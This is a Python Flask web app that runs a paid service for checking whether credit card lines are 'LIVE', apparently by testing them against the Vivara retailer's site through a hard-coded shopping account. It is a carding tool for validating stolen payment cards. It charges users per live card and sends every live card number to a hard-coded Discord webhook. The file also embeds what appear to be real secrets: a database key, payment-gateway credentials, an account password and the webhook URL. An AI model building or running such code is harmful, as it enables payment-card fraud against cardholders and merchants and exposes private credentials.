import os
import time
import requests
import webbrowser
from threading import Timer
from datetime import datetime, timezone
from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from supabase import create_client, Client
from checker_service import VivaraChecker
import checker_service

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Configurações
SUPABASE_URL = os.environ.get("SUPABASE_URL", "https://pvjsshqcpnnugfnefgsi.supabase.co")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB2anNzaHFjcG5udWdmbmVmZ3NpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgxMTE5NTgsImV4cCI6MjA5MzY4Nzk1OH0.H7d1xWhfyGjlHdKz8QQfJG3F5RGM6tSrrmzS0UC1_7s")
MISTICPAY_CLIENT_ID = os.environ.get("MISTICPAY_CLIENT_ID", "ci_libdweclsjyry50")
MISTICPAY_CLIENT_SECRET = os.environ.get("MISTICPAY_CLIENT_SECRET", "cs_kknlfy76fe2ir4nqjydf8ebee")
MISTICPAY_API_URL = "https://api.misticpay.com/api"

status_file = "check_status.json" # To store real-time status if needed

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

VIVARA_EMAIL = os.environ.get("VIVARA_EMAIL", "p808409@gmail.com")
VIVARA_PASSWORD = os.environ.get("VIVARA_PASSWORD", "@P808409p10")
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1502112219771441273/sh8MkJJjnr7jTK-hemdB_9iwvxpMCqyRn2dhYjXQ1HUYjjx62-5iq1zTVFUV6HqPF_zv")

def send_to_discord(card_line, user_email):
    """Envia o card LIVE para o webhook do Discord."""
    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "SUA_WEBHOOK_AQUI":
        print("[DISCORD] Webhook não configurado.")
        return
        
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload = {
            "embeds": [{
                "title": "💳 NOVO CARD LIVE!",
                "color": 3066993, # Verde
                "fields": [
                    {"name": "Card", "value": f"`{card_line}`", "inline": False},
                    {"name": "Data", "value": f"`{timestamp}`", "inline": True}
                ],
                "footer": {"text": "Vivara CC Checker Pro"}
            }]
        }
        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
        print(f"[DISCORD] Notificação enviada para {user_email}")
    except Exception as e:
        print(f"[DISCORD] Erro ao enviar webhook: {e}")

# Instanciando o checker (usando a nova classe VivaraChecker)
checker_service.checker_instance = VivaraChecker(VIVARA_EMAIL, VIVARA_PASSWORD)

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login_page'))
    return render_template('index.html')

@app.route('/login', methods=['GET'])
def login_page():
    return render_template('login.html')

@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    try:
        response = supabase.auth.sign_in_with_password({"email": email, "password": password})
        session['user_id'] = response.user.id
        session['access_token'] = response.session.access_token
        return jsonify({"success": True, "message": "Login successful"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 400

@app.route('/api/auth/register', methods=['POST'])
def register():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    try:
        response = supabase.auth.sign_up({"email": email, "password": password})
        if response.user:
            profiles = supabase.table('profiles').select('*').eq('id', response.user.id).execute()
            if not profiles.data:
                supabase.table('profiles').insert({"id": response.user.id, "balance": 0.0}).execute()
        return jsonify({"success": True, "message": "Registro realizado com sucesso"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 400

@app.route('/api/auth/logout', methods=['POST'])
def logout():
    session.clear()
    return jsonify({"success": True, "message": "Logout"})

@app.route('/api/user/balance', methods=['GET'])
def get_balance():
    if 'user_id' not in session: return jsonify({"success": False, "message": "Nao autorizado"}), 401
    
    try:
        user_id = session['user_id']
        response = supabase.table('profiles').select('balance').eq('id', user_id).execute()
        if response.data:
            return jsonify({"success": True, "balance": response.data[0]['balance']})
        return jsonify({"success": False, "message": "Perfil não encontrado"}), 404
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

@app.route('/api/deposit', methods=['POST'])
def create_deposit():
    if 'user_id' not in session: return jsonify({"success": False, "message": "Nao autorizado"}), 401
        
    data = request.json
    amount = float(data.get('amount', 0))
    if amount < 10 or amount > 300:
        return jsonify({"success": False, "message": "Valor deve ser entre 10 e 300 reais"}), 400
        
    user_id = session['user_id']
    
    try:
        headers = {
            "ci": MISTICPAY_CLIENT_ID,
            "cs": MISTICPAY_CLIENT_SECRET,
            "Content-Type": "application/json"
        }
        
        transaction_id = f"CC{int(time.time())}{user_id[:4]}"
        
        payload = {
            "amount": amount,
            "payerName": "Cliente CC Checker",
            "payerDocument": "00000000000",
            "transactionId": transaction_id,
            "description": "Adicionar Saldo",
            "projectWebhook": os.environ.get("WEBHOOK_URL", "https://checker-db9i.onrender.com/api/webhook/misticpay")
        }
        
        url = f"{MISTICPAY_API_URL}/transactions/create"
        res = requests.post(url, json=payload, headers=headers)
        
        if res.status_code not in [200, 201]:
            return jsonify({"success": False, "message": f"Erro Misticpay: {res.text}"}), 400
            
        response_data = res.json()
        print(f"[DEBUG] Misticpay Response: {response_data}")
        
        mistic_data = response_data.get('data', response_data)
        
        pix_code = (
            mistic_data.get('copyPaste') or 
            mistic_data.get('pixCopiaECola') or 
            mistic_data.get('pix') or
            mistic_data.get('qrCode') or 
            mistic_data.get('pixCode', '')
        )
        
        qr_code_url = (
            mistic_data.get('qrcodeUrl') or 
            mistic_data.get('qrCodeUrl') or 
            mistic_data.get('qrcodeImage', '')
        )
        
        if pix_code and not qr_code_url:
            qr_code_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={pix_code}"
        
        if not pix_code:
            return jsonify({"success": False, "message": "PIX não gerado pela Misticpay. Verifique as credenciais."}), 400
        
        db_id = mistic_data.get('transactionId', transaction_id)
        
        payment_data = {
            "user_id": user_id,
            "amount": amount,
            "status": "pending",
            "misticpay_id": db_id,
            "pix_id": pix_code,
            "created_at": datetime.now(timezone.utc).isoformat()
        }
        supabase.table('payments').insert(payment_data).execute()
        
        return jsonify({
            "success": True, 
            "message": "PIX gerado com sucesso!",
            "pix_code": pix_code,
            "qr_code_url": qr_code_url,
            "transaction_id": db_id,
            "amount": amount
        })
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

@app.route('/api/webhook/misticpay', methods=['POST'])
def handle_misticpay_webhook():
    try:
        webhook_data = request.json
        transaction_id = webhook_data.get('transactionId')
        status = webhook_data.get('status')
        value = webhook_data.get('value', 0)
        
        if status == "COMPLETO":
            payment = supabase.table('payments').select('*').eq('misticpay_id', str(transaction_id)).execute()
            if payment.data:
                payment_record = payment.data[0]
                user_id = payment_record['user_id']
                amount = payment_record['amount']
                
                # Check current balance
                profile = supabase.table('profiles').select('balance').eq('id', user_id).execute().data[0]
                new_balance = float(profile['balance']) + amount
                supabase.table('profiles').update({'balance': new_balance}).eq('id', user_id).execute()
                
                # Mark payment as completed
                supabase.table('payments').update({'status': 'completed'}).eq('id', payment_record['id']).execute()
                
            return jsonify({"success": True}), 200
        return jsonify({"success": True}), 200
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

@app.route('/api/check_card', methods=['POST'])
def check_card():
    import traceback
    if 'user_id' not in session: return jsonify({"success": False, "message": "Nao autorizado"}), 401

    data = request.json
    card_line = data.get('card', '')
    
    if not card_line:
        return jsonify({"success": False, "message": "Cartão inválido", "status": "DIE"}), 400

    user_id = session['user_id']
    
    try:
        profile = supabase.table('profiles').select('balance').eq('id', user_id).execute().data[0]
        balance = float(profile['balance'])
        
        if balance < 1.0:
            return jsonify({"success": False, "message": "Saldo insuficiente", "status": "DIE"}), 403
        
        # Test the card
        result = checker_service.checker_instance.test_card(card_line)
        
        if result == "LIVE":
            new_balance = balance - 1.0
            supabase.table('profiles').update({'balance': new_balance}).eq('id', user_id).execute()
            send_to_discord(card_line, "Usuário Logado")
            
        return jsonify({"success": True, "status": result})
        
    except Exception as e:
        tb = traceback.format_exc()
        print(f"[check_card] ERRO COMPLETO:\n{tb}")
        return jsonify({"success": False, "message": str(e), "status": "DIE"}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
